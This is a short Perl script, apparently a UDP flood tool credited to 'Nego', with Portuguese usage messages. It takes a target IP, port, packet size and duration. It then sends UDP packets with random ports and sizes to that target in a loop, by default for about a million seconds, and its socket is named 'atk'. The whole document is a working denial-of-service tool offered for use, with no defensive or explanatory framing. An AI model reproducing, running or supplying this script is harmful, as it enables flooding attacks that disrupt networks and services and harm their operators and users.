#!/usr/bin/perl
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
	printf  "\n";
	printf  "*\n";
	printf  "*\n";
	printf  "*\n";
	printf  "[Nego]\n";
	printf  "Use: Nego.pl IP PORTA 1024 0\n";  
	printf  "*\n";
	printf  "*\n";
	printf  "*\n";
	printf  "\n";
	exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 


$iaddr = inet_aton("$ip") or die "Ip Invalido $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(atk, PF_INET, SOCK_DGRAM, 17);

 
print "by Nego $ip " . ($port ? $port : "random") . " porta " . 
  ($size ? "$size-byte" : "random size") . " pacotes" . 
  ($time ? " for $time segundos" : "") . "\n";
print "Para parar use CRTL+C\n" unless $time;

 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(2000-100)+100) ;
  $pport = $port ? $port : int(rand(65500))+1;

send(atk, pack("a$psize","atk"), 0, pack_sockaddr_in($pport, $iaddr));
}


